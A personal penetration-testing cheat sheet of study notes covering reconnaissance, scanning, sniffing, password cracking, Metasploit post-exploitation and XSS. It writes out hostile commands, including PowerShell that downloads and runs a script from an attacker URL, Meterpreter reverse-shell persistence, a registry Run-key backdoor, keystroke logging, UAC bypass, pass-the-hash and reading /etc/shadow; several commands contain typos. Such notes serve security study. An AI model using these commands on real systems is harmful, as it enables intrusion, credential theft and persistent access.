---
title: "Tools and Commands Cheat Sheet"
author: [Cory M. Keller]
date: "09-06-2020"
keywords: [Pentesting, OSINT, footprinting]
...


# Tools and Commands Cheat Sheet

### Metadata

1. FOCA - windows

2. The Harvester -  Performs passive and active recon/footprinting of a target.

theharvester useful flags:

-d specifies the domain elearnsecurity.com
-l limtis to the first 100 results
-b set which search engine to use

### Infrastructure Tools

1. whosis - uses domain name to obtain alot of useful information about a target. It is a public database and should always be the first step in any investigation on infrastructure related information. It is a query-response protocol. It determines the following:

1. The owner of a domain.

2. IP address or range

3. Autonomous system

4. Technical contacts

5. Expiration date of the domain

whois is normally run pn tcp port 43.

## nslookup

A simple tool used to query a DNS server.

> nslookup < www.target.com > 

This will return IP address information. Which can also be used to perform a reverse lookup.

> nslookup -type=PTR then IP address.

nslookup can also query mail exchange servers. 

> nslookup -type=MX < www.website.com >

Zone transfers can be identified with the following command.

> nslookup -type=NS < www.website.com >

## dig

Similar tool to nslookup. Has different flags for dns enumeration. However, might be moreuseful due to its ability to return alot more and detailed information.

DNS ZONE Transfer

> dig dns.site.com AXFR +noall +answer

> dig +nocmd dns.site.com AXFR +noall +answer @website.com

## fierce

> fierce -dns dns.site.com

Will automatically try zone transfer and brute force if needed.

> fierce -dns dns.site.com -dnsserver dns1.dns.site.com

## dnsenum

> dnsenum dns.site.com 

## dnsmap

Subdomain bruteforcer.

> dnsmap website.com

Will dictionary attack subdomains and return the Ip addresses of each subdomain.

## dnsrecon

Sort of a all in one dns tool.

> dnsrecon 

## DNSdumpster

website that automates dns related information after supplying target information.

```
www.dnsdumptser.com
```

## FOCA ****GET GOOD WITH THIS

GUI Tool for domain enumeration. Gathers information and fingerprints applications.

## SHODAN

Web tool to browse and enumerate targets. Can search by protocols, names, IPs. Also contains a website called:

```
exploits.shodan.io
```
Here I can search for exploits by software version, web app daemon.

# IP address enumeration and Scanning

## fping

> fping -a -g <ip-address/subnetmask(cidr)>

a shows all alive and g generates a target list.

## NMAP

> nmap -sn <ip-address/cidr>

#### Firewall Evasion

```
-f - Fragment packets. Combine with --mtu 8,16 to customize packet size. (Does not work with -sT or -sV)

-D [ip1], [ip2], [ip3] [attackerip] <target-ip> also can be done with random IPs by using RND:"number of decoys ex 3, 8, 10" etc... - uses decoys to enumerate port information.

-T specify time between scans 1-5.

--source-port <port#> or -g port number

```

-sn runs a ping sweep and turns off the port scan on the hosts.

-sL lists targets to scan.

-Pn treat all hosts as online -- skip hosts discovery.

-PS/PA/PU/PY[portlist]: TCP, SYN/ACK, UDP or SCTP disovery.

-PE/PP/PM: ICMP echo, timestamp, netmask request discovery.

-PO[protocol list]: IP protocol. 

-n/-R: Never do DNS resolution/Always resolve

--dns-servers - specifies custom DNS servers.

--system-dns: Use OS's DNS resolver

--traceroute: Trace hop path to each host.

--sS/sT/sA/sW/sM: TCP SYN/Connect scans.

-sU: UDP scan

-sN/sF/sX: TCP NULL, FIN and Xmas scans.

--scanflags <flags>: Customize TCP scans.

-sI <zombie host[:probeport]>: Idle scan

-sY/sZ: SCTP INIT/COOKIE-ECHO scans

-sO: IP protocol scan

-b <FTP relat host>: FTP bounce scan.

### NMAP Scripts

--script or -sC(default scripts)

used to run scripts to enumerate services... http, smb, ftp, ssh etc..

can do a bssic vulnerability check with vuln. 

## maltego

Powerful target enumeration tool. 

## hping3

Used to send packets to specific ports.

> hping3 -S <ip-address> -p(port number) -c amount of packets.

Doing a zombie scan allows for a steahlier scan. It uses the IP of a host that is on the network but not talking to anyone. It is done by:

> hping3 -a <zombie ip> -S target IP -p <port>

#### Other scanning tools

1. Angry IP Scanner

2. Masscan

3. Superscan

## OS Detection

Utilize tools like ncat, telnet, netcat to perform banner grabbing and enumerate OS or service version information. 

> nc/ncat/telnet <ip-address> <port#>

## NetBIOS Enumeration

> nbstat -A < IP Address >(windows)

> nbtscan -v <Ip-address> (linux) - This tool can scan multiple addresses.

Will return netbios information supplied by the target. Useful for finding a username.

> smbclient -L <IP-address> (Linux or windows)

Mount shares like so against a windows box.

> sudo mount.cifs //<ip-address>/C /media/K_share/ user=,pass=

> enum4linux <ip-address> 

> net use \\<ip-address>\IPC$ "" /u "" - mounting a null session

> rpcclient -N -U "" <ip-address> -N means no password and -U "" means no username supplied.

## SNMP Enumeration

#### snmpwalk

> snmpwalk -v -2c <ip-address> -c publice: -v specifies the version to use(2c) while -c sets the string to use (public). If the output is numeric download the following:

snmp-mibs-downloader

#### snmpset

> snmpset -v 2c -c public <ip-address> <system OID from snmp walk> s <string to use>

#### nmap

--script "snmp-brute, snmp-info, snmp-interfaces, snmp-netstat, snmp-processes, snmp-sysdescr, snmp-win32-services".

1. snmp brute script

> --script-args snmp-brute.communitiesdb=/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt

OR

> sudo nmap -sU -p 161 <ip-address> --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Misc/wordlist-common-snmp-community-strings.txt

## Sniffing Tools

1. dnsiff

> dnsiff <options>

	-c perform half duplex TCP stream reassembly to handle asymmetrically roured traffic(such as when using arpspoof to intercept client traffic)

	-d enable debugging mode

	-m Enable automatic protocol detection

	-n Do not resolve IP addresses to hostname

	-p Process the contents of a PCAP file

	-i specifythe interface to use

2. Wireshark

http.authbasic filter

3. tcpdump

> sudo tcpdump -i <NIC>

## Spoofing

1. arpspoof

2. ettercap

3. bettercap

## SSL Traffic Sniffing

### ettercap

1. ettercap - configre to provide a fake certificate for the user to authenticate with during the TCP handshake. In order to do this etter caps config file needs to be rewritten.

1. Open the file @ /etc/ettercap/etter.conf and edit:

change the ec_uid & the ec_gid to 0.

2. change the redir_command_on/off by uncommenting them.

3. Save 

### SSL Strip

1. Perform MITM attack.

2. Replace links with HTTP clone links. 

3. Communicates with the legitimate server over HTTPS

4. Then attacker machine will transparent proxy the communication between the victim and the server. 

5. favicon images are replaced with the known secure lock icon to provide familiar visual confirmations. 

6. sslstrip will automatically log traffic passing through, like passwords and other credentials.

## Tools for weak passwords

1. Ncrack - <service name>://<ip-address>:<port>

Service name - ssh, telnet, ftp

-U/P specify path to username or password wordlist. Capital letter for a file lower case for custom usernames.

2. Medusa - similar to Ncrack but offers more options. 

> medusa <host ip> <usernames> <passwords>

-h for target hostname or ip

-H for host file path/

-u username to test

-U username file to test

-p password to test

-P pass word file to test

> medusa -h 192.168.102.149 -M telnet -U username.lst-P password.lst - Better example

3. patator - another password cracker but hydra is better. Keep in mind incase you need a different tool.

4. Session Gopher Powershell script. - Dumps passwords once on a target box. 

5. Use RsMangler and Cewl to create wordlists tailored to the target.

> cewl -m 8 <website> 

> cat <wordlist> | rsmangler --file - > <new wordlist name>

## Metasploit commands

help - find a command and what each command does

search - look for an exploit "search windows" or search "type=windows"

show - <options> hit tab twice to see all options available.

after searching for a exploit you can type "use" then the number of the exploit. So use 6 or use 2 etc...

capture fixed challenge with this exploit:

> auxiliary/server/capture/smb 

#### Metasploit folder 

Located at:

> usr/share/metasploit-framework/modules/exploits

Browse all exploits in this folder.

## Rainbow table cracker

1. rcrack_mt 

2. rainbow tables from:

> http://project-rainbowcrack.com/table.htm
> http://ophcrack.sourceforge.net/tables.php

##  Post Exploit with Meterpreter

Use the "sysinfo" command to gain useful information about the device. This will return information like:

1. Computer name
2. OS
3. Architecture 
4. Language used
5. DOMAIN
6. Users logged on
7. Meterpreter information

Now that we know what type of machine we are dealing with it is time to maintain access. Make sure the session is stable, privileged and persistent. 

Also with a meterpreter session the one thing to do for stability is to migrate the meterpreter session through another process. Something that is always running and wont be affected by user input. 

To have meterpreter automatically migrate perform the following command on metasploit.

> run post/windows/manage/migrate

To see all processes running on the machine run the following:

> ps

To manually migrate a service run the following in metasploit:

> migrate <PID> | -P <PID> | -N <name> [-t timeout]

Fastest and easiest way to priv esc with meterpreter is the command:

> getsystem

Automatically finds the best technique to elevate privileges.

To run a specific technique use:

> getsystem -t <option>

#### GETSYSTEM will only work against a windows operating system. 

MODULES for Metasploit exploits

> exploit/<OS>/local

## Metasploit UAC

UAC prevents changes to accounts. Metasploit offers a solution for that.

> post/windows/gather/win_privs

This will tell us if UAC is enabled. If UAC enabled=true then background your meterpreter session then:

> search bypassuac

> use <exploit path>

set it to your meterpreter session.

Then run the exploit. 

Run "getsystem" again.

### Meterpreter Incognito

Incognito allows for other valid user tokens on the machine to become other users. All with out cracking passwords. TO load it perform in the meterpreter session:

> use incognito - loads the extension.

Then use the following command:

> list_tokens -u : Gives us the user tokens available on a server. 

Then to impersonate another user do:

> impersonate_token <token-name>

## Unquoted Service Path Vulnerabilities

This means abusing the way windows searches for executables belonging to a service. Can be used to obtain persistence in a system or escalate privileges to SYSTEM. 

This issue arises when wondows has been configured with a path to a service binary which is unquoted and additionally contains spaces in its path. 

This attack involves replacing an executable with a malicious one. 

###### Windows command line search for unquoted executables

> C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

###### Metasploit automatic attack for unquoted service path

> use exploit/windows/local/trusted_service_path

## Maintaining access

1. Password hash cracking

	- Pass the hash - allow connection to remote machine without cracking the hash. 
	
	> (metasploit) use exploit/windows/smb/psexec

	Configure options like the smb hash, smbuser and the RHOST

	Also can be done via mimikatz. 

	- Crack the hash

2. Backdoor - Create and install an executable to remain throughout reboots. Can be automated through metasploit.

> (In Meterpreter) run persistence -<options> (-h for help)

	-A starts the handler on the attacker machine

	-X start the agent at boot (requires system privileges)

	-i 5 connection attempts each at 5 second intervals

	-p specify the port

	-r attacker IP address

Set payload from metasploit 

> <OS>/meterpreter/reverse_tcp

Use: exploit/multi/handler to setup a listener for the connection.

Backdoor manual:

1. Create backdoor with metasploit

2. edit registry key:

> reg setval –k [registry_key_path] –d [value_of_the key] –v [name_of_the_key]

example: HKLM\\software\\microsoft\\windows\\currentversion\\run  -d "C:\Windows\my_bd.exe" -v bd_name

3. New users - create a new user on the machine to remotely connect to.

## Pillaging useful commands and scripts

from metasploit while in a meterpreter session(can be done with a backgrounded session:

> run post/windows/gather -  this will display all post gathering scripts for a windows device in metasploit. 

> run post/linux/gather - shows all linux post exploit gathering scripts in metasploit.

> run post/multi/gather - shows scripts for all OS's.

Some useful scripts:

> enum_services - shows all services running on the remote machine. 

> ps - shows all processes running on a linux system

> Linux password and users:

 - cat /etc/passwd or /etc/shadow

> Windows users:

	- net user

	- net user /domain - shows domain controller and users

	- net localgroup - shows groups

	- net localgroup <group name> - shows members of the group

	- net share - shows smb shares

		- run enum_shares - metasploit module to enumerate shares

## Log keystrokes during login

> winlogon.exe can be exploited to try and gather windows logon information

While in meterpreter:

1. Migrate to the winlogon.exe pid with "getpid".

2. keyscan_start.

3. keyscan_dump - repeat until keystrokes dumped/someone logs on.

4. run keylogrecoder <option> "-h to show options".

## Data Exfiltration

1. DNS Tunneling - Popular because alot of organizations are not checking for anomalous DNS traffic which makes it a go-to vector for exfiltrating data out of a target network and over under monitored channels.

##### DNS Exfiltration Tools and commands

1. lodine - https://code.kryo.se/iodine/

In order to use lodine you need:

	- Control of a domain you own and its DNS configuration.
	- An IP address to act as the authoritative Name Server for your domain name for which you have SSH access as well.

## Internal Network Enumeration

> route print - prints IP route table. 

> arp -  prints arp cache of the host.

> netstat allows users to display all the host connections, including listening ports and established connections. 

	- netstat has many options. On linux -b will display associated files utilizing the connection.

	- netstat -tulpn is a common one. -t tcp -u udp -l listening -p program -n numerical addresses.

###### Metasploit modules for network scanning

> run arp_scanner "-h" for options

> use post/multi/gather/ping_sweep

	- set options then exploit

> (meterpreter) run netenum <option>"-h for options"

#### Add IP routes

> route add <IP> <subnet> <meterpreter session #>

> run autoroute -s <Subnet address/CIDR>

## Pivoting Tools, Attacks and Commands

1. Pass the hash

> use exploit/windows/smb/psexec 

	- set payload, RHOST, SMBuser account, smbhash.

## Downloading files to remote target

#### Via Powershell

> powershell.exe -nop -ep bypass -C iex <New-Object Net.Webclient>.DownloadString('http://<attacker IP address:<httpserver port>/<file>'); <Invoke file download if powershell file>

# Anonymity

## Port Forwarding

> ssh -L [LOCAL PORT TO LISTEN ON]:[REMOTE MACHINE]:[REMOTE PORT] [USERNAME]@[SSHSERVER]

EXAMPLE SCENARIO: ssh–L 3000:homepc:23 root@mybox

This creates a connection to the SSH server then create a connection with protocol you set as the port to listen on. 

> telnet <localhost>:3000. This creates a connection to the box using telnet but going through the SSH tunnel on port 3000.

Another example: ssh -L 3000:localhost:3306 els@192.168.231.135

Then connect to the mysql service with a mysql command:

> mysql -h 127.0.0.1 -P 3000 -u root

# Powershell

## Useful cmdlets

1. Get-Process - Listing of all processes. 

2. Get-ChildItem - Lists items in a directory, can also use the "ls" command.

3. Get-WMIObject - Returns information about named WMI object. 

> PS C:\> Get-WmiObject -class win32_operatingsystem | select -Property *

4. Access windows Registry Hives: 

> cd HKLM:\

5. Select-String with the -Path and -Pattern argument is a useful cmdlet to scour the system for files containing certain strings. 

> Select-String -Path C:\users\user\Documents\*.txt -Pattern pass*

6. Get-Content - display full contents of a file. 

7. Get-Service - cmdlet that will get information about the installed services and can be useful in the case we can ID a service which might be vulnerable. 

### Useful Modules

A module is a set of powershell functionalities grouped together in the form of a single file that will have a ".psm1" file extension. 

Use: Get-Module -ListAvailable to see a list of available modules.

##### Importing Modules

> Import-Module .\module.psm1

### Powersploit Import

1. Get Powersploit into the computer.

2. Navigate to the directory containing the Powersploit foler

3. Perform the following:

> Import-Module Powersploit

## Powershell TCP Port Scanner

$ports=(portnumbers, portnumbers);
$ip=<ip-address>

foreach ($port in $ports) {try{$socket=New-Object System.Net.Sockets.TcpClient($ip, $port);}

catch();

if ($socket -eq $null) {echo $ip":"$port" - Closed";) else(echo $ip":"$port" - Open";
$socket - $null;)}

## Downloading and Execution

### Windows Powershell In Memory

> Net.WebClient DownloadString

> Net.WebClient DownloadData

> Net.WebClient OpenRead

REAL EXAMPLE:

> powershell.exe iex (NeObject Net.WebClient) .DownloadString("http://attackerurl/script.ps1")

* Remove the powershell.exe if already in Powershell prompt

Can give different extensions for a powershell script as powershell will still run it as a .ps1 no matter the extension.

# On Disk

> Certutil.exe w/ -urlcache argument

## Create the xml document with Powershell command inside

? could be used to create a reverse shell?????

<?xml version="1.0"?>
<command>
	<a>
		<execute>[POWERSHELL COMMAND]</execute>
	</a>
</command>
?>

----

# Network Exploitation

## Password Attacks

Essentially a reverse dictionary attack. Use a single password amongst thousands-millions of users. Prevents account lock out.

Can utilize tools like:

The Harvester 

These tools can extract useful data from organizations. Especially usernames and username formats.

## Samba Exploits

> nmap --script smb-os-discovery -p445 <IP-address>

> metasploit - "multi/samba/usermap_script"

## Samba symlink traversal

1. 
> metasploit admin/smb/samba_symlink_traversal 

2.
> smbclient \\\\<IP-address>\\tmp -N

3. Change to the root directory if there

> cd rootfhs

> cd etc

> get <filename> "Try shadow so hashes can be cracked"

BONUS

Can use tar with smb filesharing to minimize file downloads. Or combine them all into one tar ball 

> cd etc

> tar c ../tmp/allfiles.tar *

# Web Application Enumeration and Tool usage

## XSS

Place a JS test script in place of a URL query string

```
http://victim.site/welcome.php?name=</h1><script>alert('This is a test XSS');</script>
```

XSS can be used as:

Cookie stealing
Complete control over a browser
Initiating exploitation phase against browser plugins first and then the machine
Perform keylogging

To avoid the html tags breaking like the first test example could do try:

```
"><body onload="alert('XSS EXAMPLE')
or
" onload="javascript:alert('XSS EXAMPLE')
or
" onload="alert(String.fromCharCode(88,83,83))

```



